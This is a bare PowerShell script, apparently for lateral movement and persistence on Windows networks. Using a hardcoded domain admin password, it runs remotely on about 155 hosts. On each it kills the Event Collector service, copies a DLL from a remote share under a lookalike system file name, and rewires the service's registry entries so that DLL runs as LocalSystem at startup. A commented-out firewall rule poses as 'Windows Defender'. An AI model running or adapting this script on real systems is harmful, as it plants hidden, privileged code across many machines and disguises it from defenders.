
$pass = ConvertTo-SecureString "<n57></n57>2" -AsPlainText -force
$cred = new-object System.Management.Automation.PSCredential("n57\admin", $pass)

icm 10.20.0.100, 10.20.0.101, 10.20.0.102, 10.20.0.103, 10.20.0.104, 10.20.0.105, 10.20.0.106, 10.20.0.107, 10.20.0.108, 10.20.0.109, 10.20.0.110, 10.20.0.111, 10.20.0.112, 10.20.0.113, 10.20.0.114, 10.20.0.115, 10.20.0.116, 10.20.0.117, 10.20.0.118, 10.20.0.119, 10.20.0.120, 10.20.0.121, 10.20.0.122, 10.20.0.123, 10.20.0.124, 10.20.0.125, 10.20.0.126, 10.20.0.127, 10.20.0.128, 10.20.0.129, 10.20.0.130, 10.20.0.131, 10.20.0.132, 10.20.0.133, 10.20.0.134, 10.20.0.135, 10.20.0.136, 10.20.0.137, 10.20.0.138, 10.20.0.139, 10.20.0.140, 10.20.0.141, 10.20.0.142, 10.20.0.143, 10.20.0.144, 10.20.0.145, 10.20.0.146, 10.20.0.147, 10.20.0.148, 10.20.0.149, 10.20.0.150, 10.20.0.151, 10.20.0.152, 10.20.0.153, 10.20.0.154, 10.20.0.155, 10.20.0.156, 10.20.0.157, 10.20.0.158, 10.20.0.159, 10.20.0.160, 10.20.0.161, 10.20.0.162, 10.20.0.163, 10.20.0.164, 10.20.0.165, 10.20.0.166, 10.20.0.167, 10.20.0.168, 10.20.0.169, 10.20.0.170, 10.20.0.171, 10.20.0.172, 10.20.0.173, 10.20.0.174, 10.20.0.175, 10.20.0.176, 10.20.0.177, 10.20.0.178, 10.20.0.179, 10.20.0.180, 10.20.0.181, 10.20.0.182, 10.20.0.183, 10.20.0.184, 10.20.0.185, 10.20.0.186, 10.20.0.187, 10.20.0.188, 10.20.0.189, 10.20.0.190, 10.20.0.191, 10.20.0.192, 10.20.0.193, 10.20.0.194, 10.20.0.195, 10.20.0.196, 10.20.0.197, 10.20.0.198, 10.20.0.199, 10.20.0.200, 10.20.0.201, 10.20.0.202, 10.20.0.203, 10.20.0.204, 10.20.0.205, 10.20.0.206, 10.20.0.207, 10.20.0.208, 10.20.0.209, 10.20.0.210, 10.20.0.211, 10.20.0.212, 10.20.0.213, 10.20.0.214, 10.20.0.215, 10.20.0.216, 10.20.0.217, 10.20.0.218, 10.20.0.219, 10.20.0.220, 10.20.0.221, 10.20.0.222, 10.20.0.223, 10.20.0.224, 10.20.0.225, 10.20.0.226, 10.20.0.227, 10.20.0.228, 10.20.0.229, 10.20.0.230, 10.20.0.231, 10.20.0.232, 10.20.0.233, 10.20.0.234, 10.20.0.235, 10.20.0.236, 10.20.0.237, 10.20.0.238, 10.20.0.239, 10.20.0.240, 10.20.0.241, 10.20.0.242, 10.20.0.243, 10.20.0.244, 10.20.0.245, 10.20.0.246, 10.20.0.247, 10.20.0.248, 10.20.0.249, 10.20.0.250, 10.20.0.251, 10.20.0.252, 10.20.0.253, 10.20.0.254 -Credential $cred -ScriptBlock {
    net use O: \\mgmt\c$\Users\Public\Music /user:n57\Admin "<n57></n57>2"
    $p = Tasklist /svc /fi "SERVICES eq Wecsvc" /fo csv | convertfrom-csv
    stop-process -id $p.PID -Force
    cp 'O:\w.dll' c:\windows\system32\wecsrv.dll -force
    Set-ItemProperty -Path HKLM:\system\CurrentControlSet\Services\Wecsvc\ -Name ObjectName -Value "LocalSystem"
    Set-ItemProperty -Path HKLM:\system\CurrentControlSet\Services\Wecsvc\ -Name Start -Value 2
    Set-ItemProperty -Path HKLM:\system\CurrentControlSet\Services\Wecsvc\ -Name ErrorControl -Value 0
    Set-ItemProperty -Path HKLM:\system\CurrentControlSet\Services\Wecsvc\ -Name ImagePath -Value "%SystemRoot%\system32\svchost.exe -k localService -p"
    Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\Wecsvc\Parameters -Name ServiceDll -Value "%SystemRoot%\System32\wecsrv.dll"
    Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\Wecsvc\Parameters -Name ServiceMain -Value "ServiceMain"
    $a = @()
    $list = ((Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" -Name NetworkService).networkservice)
    foreach ($item in $list) { if ($item -ne "WECSVC") {$a += ($item)}}
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" -Name NetworkService -value $a
    $b = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" -Name LocalService).localservice
    $c = "nsi", "WdiServiceHost", "w32time", "EventSystem", "RemoteRegistry", "SstpSvc", "netprofm", "lltdsvc", "FontCache", "fdphost", "bthserv", "tzautoupdate", "SEMgrSvc", "WinHttpAutoProxySvc", "PhoneSvc", "WebClient", "CDPSvc", "workfolderssvc", "SharedRealitySvc", "LicenseManager", "WECSVC"
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" -Name LocalService -value $c
    start-service wecsvc


    # Remove-ItemProperty -Path HKLM:\system\CurrentControlSet\Services\Wecsvc\ -Name RequiredPrivileges
    # Remove-ItemProperty -Path HKLM:\system\CurrentControlSet\Services\Wecsvc\ -Name DependOnService
    # New-NetFirewallRule -DisplayName "Windows Defender" -Direction Inbound -LocalPort 49671 -Protocol TCP -Action Allow
}

